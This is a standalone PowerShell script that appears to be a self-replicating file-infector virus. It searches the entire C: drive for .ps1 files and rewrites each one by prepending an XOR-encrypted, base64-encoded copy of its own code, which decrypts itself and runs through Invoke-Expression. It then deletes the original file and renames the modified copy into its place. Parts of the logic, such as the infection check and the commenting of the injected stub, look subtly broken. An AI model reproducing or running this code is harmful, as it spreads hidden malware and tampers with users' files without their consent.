# Procedure:OPEN
function Execute($main) {
    #Get a list of all ps1 files
    $filenames = Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse

    #Check each file 
    foreach ($filename in $filenames) {
        #Open the file 
        $script = Get-Content $filename

        # Check not running
        $first_line = $script[0]
        $file_hash = Get-FileHash -Algorithm MD5 $filename.FullName | ForEach-Object Hash

        if ($first_line -notmatch $file_hash) {
            # Write to a new file to avoid issues with large files 
            $running = "$filename.dat"

            $checksum = "# Checksum: $file_hash"
            $init = "# $(mq $main)"
            $script = $checksum, $init, $script
            Set-Content -Path $running -Value $script

            # Move the modified file into place 
            Remove-Item -Path $filename.FullName
            Rename-Item -Path $running -NewName $filename.Name
        }
    }
}

function mq($main) {
    # Gen Key
    $str = '0123456789abcdef'
    $key = -join (1..$main.Length | ForEach-Object { Get-Random -Maximum $str.Length | ForEach-Object { $str[$_] } })

    # Encrypt 
    $mq = xorCipher $main $key
    $package = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($mq))

    $quicksand = @"
    # Encrypted data
    \$mq = '$package'

    # Key
    \$key = '$key'

    \$main = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(\$mq))
    \$main = xorCipher \$main \$key
    Invoke-Expression \$main
    Execute \$main
"@
    return $quicksand
}

function xorCipher($text, $key) {
    $output = ''
    for ($i = 0; $i -lt $text.Length; $i++) {
        $output += [char]([int][char]$text[$i] -bxor [int][char]$key[$i % $key.Length])
    }
    return $output
}

$main = Get-Content $MyInvocation.MyCommand.Path
$main = $main[($main.IndexOf("# Procedure:OPEN") + 1)..($main.IndexOf("# Procedure:CLOSE") - 1)] -join "`r`n"
Execute $main
# Procedure:CLOSE
